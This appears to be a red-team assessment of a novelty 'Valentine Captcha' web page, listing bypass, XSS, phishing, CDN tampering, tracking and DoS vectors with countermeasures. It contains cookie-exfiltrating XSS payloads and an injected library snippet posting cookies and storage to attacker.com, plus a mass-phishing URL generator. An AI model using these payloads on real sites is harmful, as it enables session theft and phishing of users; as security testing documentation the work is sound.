# Red Team Attack Vectors & Exploitation Guide
## Valentine Captcha Project

**Date:** 2026-05-29  
**Classification:** Security Testing Documentation  
**Intended Use:** Authorized Security Testing Only

---

## Overview

This document outlines concrete attack vectors against the Valentine Captcha application. Each vector includes:
- Technical details and proof-of-concept
- Difficulty level (Trivial / Easy / Medium / Hard)
- Impact assessment
- Defensive countermeasures

---

## 1. CAPTCHA BYPASS - Trivial Difficulty

### Vector 1.1: Direct Stage Manipulation

**Difficulty:** Trivial  
**Attack Vector:** Browser console manipulation

**Steps:**
1. Open the Valentine Captcha page in a browser
2. Open DevTools (F12)
3. Navigate to the "Console" tab
4. Execute:

```javascript
// Method 1: Directly manipulate React state (if you know the root component)
const root = document.getElementById('root')._reactRootContainer;
// Note: React internals vary; this may not always work

// Method 2: Reload page with hash modification
window.location.hash = '#/reveal';

// Method 3: Check if stage state is in window scope
console.log(window); // Look for stage-related variables
```

**Result:** Immediate access to reveal page  
**Prevention:** None (client-side only)

---

### Vector 1.2: CSS Class Manipulation

**Difficulty:** Easy  
**Attack Vector:** DOM inspection and CSS override

```javascript
// Inspect the grid verification logic
const btn = document.querySelector('.verify-btn');
console.log(btn); // Find the verification button

// Simulate click with modified state
// Since state is React-based, this requires modifying React internals
// Alternatively, inspect network calls if there were an API

// Or simply disable client-side validation:
// The "correctCells" value is in window.VALENTINE_CONFIG
console.log(window.VALENTINE_CONFIG.correctCells);
// Change it:
window.VALENTINE_CONFIG.correctCells = "any"; // Bypass "all" requirement
```

**Result:** Can change captcha rules on the fly  
**Prevention:** Server-side validation

---

### Vector 1.3: LocalStorage/SessionStorage Abuse

**Difficulty:** Easy  
**Attack Vector:** Modify client-side storage if stage state is persisted

```javascript
// If the application stored stage info in localStorage:
localStorage.setItem('stage', 'reveal');
sessionStorage.setItem('captcha_completed', 'true');

// Reload the page
location.reload();
```

**Result:** Persistence across page reloads  
**Prevention:** Never trust client-side storage for security decisions

---

## 2. XSS INJECTION - Easy Difficulty

### Vector 2.1: Basic HTML Injection via URL Parameters

**Difficulty:** Easy  
**Attack Vector:** Reflected XSS via `?to=`, `?from=`, `?msg=` parameters

**Payload Examples:**

```
# Basic alert box:
https://valentine.example.com/?to=Test<img src=x onerror="alert('XSS')">

# Cookie exfiltration:
https://valentine.example.com/?to=Test<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">

# Redirect to phishing site:
https://valentine.example.com/?to=Test<img src=x onerror="window.location='https://attacker.com/phishing'">

# DOM-based attack:
https://valentine.example.com/?msg=<script>alert(1)</script>
```

**Status:** 🟢 Currently Protected  
- React JSX auto-escapes text content
- These payloads will render as literal text, not execute

**Potential Escape:**
If the React version changes or JSX compilation is modified, escaping could break.

**Test:**
```bash
curl "https://valentine.example.com/?to=<img src=x onerror=alert(1)>" | grep -i "img src=x"
```

---

### Vector 2.2: postMessage XSS

**Difficulty:** Easy  
**Attack Vector:** postMessage with unvalidated origin

**Exploit (if page is embedded in an iframe):**

```javascript
// Attacker's parent page:
const iframe = document.createElement('iframe');
iframe.src = 'https://valentine.example.com/';
document.body.appendChild(iframe);

// Wait for iframe to load
setTimeout(() => {
  // Send malicious postMessage without origin validation
  iframe.contentWindow.postMessage({
    type: '__activate_edit_mode'
  }, '*'); // No origin check in the page!
  
  // The tweaks panel activates, exposing internal state
}, 2000);

// Listen for the page's own postMessage broadcasts:
window.addEventListener('message', (e) => {
  if (e.data.type === '__edit_mode_set_keys') {
    console.log('Captured tweaks:', e.data.edits);
    // Extract user data (names, messages, etc.)
  }
});
```

**Result:** Activate hidden tweaks panel, extract state  
**Prevention:** Validate `e.origin` in postMessage handlers

---

### Vector 2.3: Unicode/Encoding Bypass

**Difficulty:** Medium  
**Attack Vector:** UTF-8/Unicode encoding of dangerous characters

```
# URL-encoded XSS:
?to=%3Cimg%20src=x%20onerror=alert(1)%3E

# Double-encoded:
?to=%253Cimg%20src=x%20onerror=alert(1)%253E

# Unicode escape:
?to=<img src=x onerror=alert(1)>
```

**Result:** React typically handles these correctly, but worth testing  
**Prevention:** Never rely solely on auto-escaping; validate inputs

---

## 3. PHISHING ATTACKS - Easy Difficulty

### Vector 3.1: Deceptive Message Injection

**Difficulty:** Easy  
**Attack Vector:** Use `?msg=` parameter to inject fake security warnings

```
https://valentine.example.com/?to=John&from=Your Bank&msg=Your account has been locked. Click here to verify: <a href="https://attacker.com/phishing">verify now</a>
```

**Result:** Victim sees a "official" message (from the captcha UI) directing them to phishing site  
**Impact:** High - Lends legitimacy to phishing attempt

**Prevention:**
- Sanitize message content
- Warn users that messages come from URL parameters
- Add "SPOOFED MESSAGE - FROM URL PARAMETERS" warning

---

### Vector 3.2: Fake Image Substitution

**Difficulty:** Easy  
**Attack Vector:** Replace images with phishing content

```
https://valentine.example.com/?img0=https://attacker.com/fake-bank-logo.jpg&img1=https://attacker.com/fake-email.jpg&prompt=Click+the+bank+logo&msg=Verify+your+account+for+security
```

**Result:**
- User sees fake bank imagery
- Captcha asks them to "verify" (click images)
- Redirects to phishing site

**Impact:** Very High - Complete social engineering attack

**Prevention:**
- Validate image URLs against whitelist
- Add prominent "CUSTOM IMAGES FROM URL" warning
- Don't use this in production without validation

---

## 4. CDN COMPROMISE - Medium Difficulty

### Vector 4.1: Man-in-the-Middle (MitM) Attack on unpkg.com

**Difficulty:** Medium (requires network access or ISP cooperation)  
**Attack Vector:** Intercept React library fetch and inject malicious code

**Prerequisite:** Network position (hotel WiFi, corporate proxy, ISP, nation-state)

**Steps:**
1. User visits valentine.example.com
2. Browser requests: `https://unpkg.com/react@18.3.1/umd/react.production.min.js`
3. Attacker intercepts the request (DNS spoofing, ARP spoofing, or BGP hijacking)
4. Attacker serves malicious React library
5. Malicious library exfiltrates all data and modifies page behavior

**Example Malicious Injection (in React library):**
```javascript
// Attacker appends to react.production.min.js:
(function() {
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({
      page: window.location.href,
      cookies: document.cookie,
      localStorage: localStorage,
      sessionStorage: sessionStorage
    })
  });
})();
```

**Result:** Complete page compromise, data exfiltration  
**Impact:** Critical - Affects all users on that network

**Prevention:**
- Add Subresource Integrity (SRI) hashes
- Use HTTPS only (already done, but verify with HSTS)
- Consider serving React locally instead of from CDN

**Current Status:**
```html
<!-- UNSAFE: No SRI hash -->
<script src="https://unpkg.com/react@18.3.1/umd/react.production.min.js"></script>

<!-- SAFE: With SRI hash -->
<script src="https://unpkg.com/react@18.3.1/umd/react.production.min.js" 
        integrity="sha384-[HASH HERE]"></script>
```

---

## 5. CONFIGURATION EXTRACTION - Easy Difficulty

### Vector 5.1: Accessing window.VALENTINE_CONFIG

**Difficulty:** Easy  
**Attack Vector:** Direct access to window object

```javascript
// In browser console:
console.log(window.VALENTINE_CONFIG);

// Result might be:
{
  to: "Sarah",
  from: "Alex",
  message: "Secret message here",
  images: ["https://internal.company.com/photo1.jpg", ...],
  challengePrompt: "a heart",
  correctCells: "all"
}
```

**Impact:** Extracts personalization, reveals custom image URLs  
**Prevention:** Don't store sensitive data in client-side configuration

---

### Vector 5.2: Extracting Correct Cell Answers

**Difficulty:** Easy  
**Attack Vector:** Parse the correctCells array

```javascript
// View the correct answers:
console.log(window.VALENTINE_CONFIG.correctCells);
// Output: "all" or [0, 3, 8] or "any"

// If it's an array, you know exactly which cells are "correct"
if (Array.isArray(window.VALENTINE_CONFIG.correctCells)) {
  const correct = window.VALENTINE_CONFIG.correctCells;
  console.log(`Only click cells: ${correct.join(', ')}`);
}
```

**Result:** Trivial bypass of captcha  
**Prevention:** Server-side validation

---

## 6. STATE MANIPULATION - Easy Difficulty

### Vector 6.1: Decline Button Removal

**Difficulty:** Easy  
**Attack Vector:** Set component state directly

The decline button has a "skitter away" behavior. An attacker can force it to disappear:

```javascript
// The page likely tracks this internally. If we can access React DevTools:
// Open React DevTools (Chrome extension)
// Navigate to the component tree
// Find the stage variable and change it to "reveal"
```

**Result:** Skip the decline button entirely  
**Prevention:** N/A - purely cosmetic feature

---

### Vector 6.2: Slider Bypass

**Difficulty:** Trivial  
**Attack Vector:** Inject JavaScript to auto-complete slider

```javascript
// Simulate slider movement:
const sliderInput = document.querySelector('input[type="range"]');
sliderInput.value = 100;
sliderInput.dispatchEvent(new Event('change', { bubbles: true }));

// Click the confirm button:
document.querySelector('.verify-btn').click();
```

**Result:** Instant progression to reveal stage  
**Prevention:** Server-side validation

---

## 7. INFORMATION DISCLOSURE - Easy Difficulty

### Vector 7.1: Comment Extraction from HTML

**Difficulty:** Easy  
**Attack Vector:** Search for comments revealing sensitive info

```javascript
// Extract all HTML comments:
const comments = document.documentElement.innerHTML.match(/<!--(.*?)-->/g);
console.log(comments);

// In this case, there are none, but developers often leave notes
```

**Result:** Potential exposure of debug info  
**Prevention:** Strip all comments from production builds

---

### Vector 7.2: Source Map Leakage

**Difficulty:** Easy  
**Attack Vector:** Check for .map files

```bash
curl https://valentine.example.com/app.jsx.map
```

If sourcemaps are deployed, attacker can view original non-minified code, comments, and structure.

**Prevention:** Don't deploy .map files to production

---

## 8. SOCIAL ENGINEERING - Medium Difficulty

### Vector 8.1: Embedded Malware Link

**Difficulty:** Easy  
**Attack Vector:** Use message parameter to inject link

```
?from=System Admin&msg=Your device is at risk. Download security update: <a href="https://attacker.com/malware.exe">Click here</a>
```

**Result:** Social engineering attack using captcha as legitimacy vehicle  
**Prevention:** Sanitize message, warn about custom content

---

### Vector 8.2: Fake Valentine Spam Campaign

**Difficulty:** Easy  
**Attack Vector:** Automate custom URL generation

```python
#!/usr/bin/env python3
import requests
from urllib.parse import urlencode

targets = ['user1@company.com', 'user2@company.com', 'user3@company.com']

for target in targets:
    params = {
        'to': target,
        'from': 'CEO',
        'msg': f'Visit https://attacker.com/redirect for a surprise!',
        'img0': 'https://attacker.com/ceo-photo.jpg'
    }
    url = f"https://valentine.example.com/?{urlencode(params)}"
    print(f"Generated: {url}")
    
    # Send via email, Slack, etc.
    # send_email(target, f"You have a Valentine from your CEO! {url}")
```

**Result:** Mass phishing campaign with legitimacy borrowed from captcha  
**Impact:** Very High - Hard to detect as phishing

**Prevention:** Rate limiting, CAPTCHA on sending side, sender verification

---

## 9. PRIVACY ATTACKS - Medium Difficulty

### Vector 9.1: Image Request Tracking

**Difficulty:** Easy  
**Attack Vector:** Use image URLs to track users

When an attacker sets `?img0=https://attacker.com/track.gif?user=target`, the browser **automatically** fetches that image.

**Tracking Attack:**
```
?img0=https://attacker.com/1x1.gif?user=john&session=12345&timestamp=1234567890
```

Server logs show:
```
GET /1x1.gif?user=john&session=12345&timestamp=1234567890 200 1B
Referrer: https://valentine.example.com/?to=John&from=Attacker
```

**Result:** Attacker knows:
- When John visited the link
- From what session
- What the message was (in referrer)

**Prevention:** Validate image URLs against whitelist

---

## 10. DENIAL OF SERVICE - Easy Difficulty

### Vector 10.1: Resource Exhaustion via Large Images

**Difficulty:** Easy  
**Attack Vector:** Link to extremely large images

```
?img0=https://attacker.com/huge-file.jpg (10GB+)
?img1=https://attacker.com/hd-video.mp4 (50GB+)
```

Browser will attempt to download all 9 images. With large files, this exhausts bandwidth/storage.

**Prevention:** Limit image size, validate domains

---

### Vector 10.2: Rapid URL Generation DoS

**Difficulty:** Easy  
**Attack Vector:** Generate thousands of unique URLs to exhaust CDN/hosting cache

```bash
for i in {1..10000}; do
  curl "https://valentine.example.com/?to=Test&from=User&msg=Message${i}"
done
```

This could fill access logs, cache, or slow down hosting.

**Prevention:** Rate limiting on the hosting provider

---

## Testing Methodology

### Manual Testing Checklist

```
[ ] Bypass captcha in < 10 seconds
[ ] Extract window.VALENTINE_CONFIG
[ ] Inject XSS payload via URL parameters
[ ] Verify postMessage origin validation
[ ] Check for CSP headers
[ ] Attempt MitM attack on React CDN
[ ] Load malicious image URLs
[ ] Test phishing message injection
[ ] Verify no source maps deployed
[ ] Check for HTML comments
```

### Automated Testing

```bash
#!/bin/bash

TARGET="https://valentine.example.com"

echo "[+] Testing for XSS vulnerabilities..."
curl -s "$TARGET/?to=<img src=x onerror=alert(1)>" | grep -i "img src=x"

echo "[+] Checking for CSP headers..."
curl -sI "$TARGET" | grep -i "content-security-policy"

echo "[+] Verifying SRI hashes..."
curl -sI "https://unpkg.com/react@18.3.1/umd/react.production.min.js" | grep -i "integrity"

echo "[+] Checking for source maps..."
curl -s "$TARGET/app.jsx.map" | grep -q "sources" && echo "LEAK: Source map found!" || echo "OK: No source map"

echo "[+] Testing image loading..."
curl -s "$TARGET/?img0=https://attacker.com/track.gif" -w "%{http_code}\n" -o /dev/null
```

---

## Severity Matrix

| Vector | Difficulty | Impact | Detectability | Overall Risk |
|--------|-----------|--------|----------------|--------------|
| Captcha Bypass | Trivial | Medium | Easy | **🔴 CRITICAL** |
| XSS Injection | Easy | High | Medium | **🔴 CRITICAL** |
| postMessage XSS | Easy | Medium | Hard | **🟠 HIGH** |
| Phishing | Easy | Very High | Hard | **🟠 HIGH** |
| CDN MitM | Medium | Critical | Very Hard | **🟠 HIGH** |
| Image Tracking | Easy | Low | Hard | **🟡 MEDIUM** |
| Config Extraction | Easy | Low | Easy | **🟡 MEDIUM** |
| DoS via Images | Easy | Medium | Easy | **🟡 MEDIUM** |

---

## Conclusion

The Valentine Captcha has **no security hardening** against any of these attacks. This is acceptable **if and only if** the application is clearly **not presented as providing security**.

**Recommended Actions:**
1. ✅ If decorative: Keep as-is, document limitations
2. ⚠️ If user-facing: Implement the Medium-priority fixes
3. 🚫 If claiming any security: Implement ALL mitigations + server-side validation

---

**References:**
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- CWE/SANS Top 25: https://cwe.mitre.org/top25/
- PortSwigger Web Security Academy: https://portswigger.net/web-security

